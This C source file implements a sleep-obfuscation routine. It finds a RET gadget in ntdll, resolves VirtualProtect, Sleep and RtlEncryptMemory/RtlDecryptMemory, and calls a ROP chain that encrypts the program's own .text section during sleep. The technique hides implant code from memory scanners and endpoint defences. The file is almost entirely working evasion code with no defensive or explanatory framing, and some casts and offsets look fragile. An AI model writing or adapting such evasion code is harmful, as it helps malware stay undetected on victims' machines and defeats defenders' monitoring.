//Copyright lemond69 2023
#include <windows.h>
extern void* ropsled(void* vpt, //address of VirtualProtect
                     void* sleep, //address of Sleep
                     void* encmem, //RtlEncryptMemory, known as SystemFunction040
                     void* decmem, //RtlDecryptMemory, known as SystemFunction041
                     unsigned int size, //size of data to encrypt
                     DWORD* dapt, //a random DWORD pointer, used in VirtualProtect
                     void* retrop, //address of ROP gadget containing RET instruction
                     void* data, //address of data to encrypt
                     unsigned int dur); //duration of encryption
unsigned int ropfind(){
    void* img = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)img;
    unsigned int textloc = ((PIMAGE_SECTION_HEADER)(img + dosHeader->e_lfanew + 248))->VirtualAddress;
    unsigned char* va = ((unsigned char*) img) + textloc;
    while (va[0]!=(unsigned char)'\xc3')
        va++;
    return (unsigned int)va;
}
void getsize(unsigned int* va, unsigned int* sz){
    void* img = GetModuleHandleA(NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)img;
    *sz = ((PIMAGE_SECTION_HEADER)(img + dosHeader->e_lfanew + 248))->SizeOfRawData;
    *va = ((PIMAGE_SECTION_HEADER)(img + dosHeader->e_lfanew + 248))->VirtualAddress;
}
void sleep(unsigned int duration){
    //get WINAPI func addresses
    void* kernel = LoadLibraryA("kernel32.dll");
    void* advapi = LoadLibraryA("advapi32.dll");
    void* vpt = GetProcAddress(kernel, "VirtualProtect"); //note - using this versus just typing `VirtualProtect` will give diff result on some compilers, take note
    void* slp = GetProcAddress(kernel, "Sleep");
    void* ecm = GetProcAddress(advapi, "SystemFunction040");
    void* dcm = GetProcAddress(advapi, "SystemFunction041");
    //find the rop gadget, we will take from ntdll
    void* pr = (void*)ropfind();
    //get .text section in current PE
    unsigned int va = 0;
    unsigned int sz = 0;
    getsize(&va, &sz);
    void* data = ((unsigned char*)GetModuleHandleA(NULL)) + va;
    DWORD a;
    //execute rop sled
    ropsled(vpt, slp, ecm, dcm, sz, &a, pr, data, duration);
}

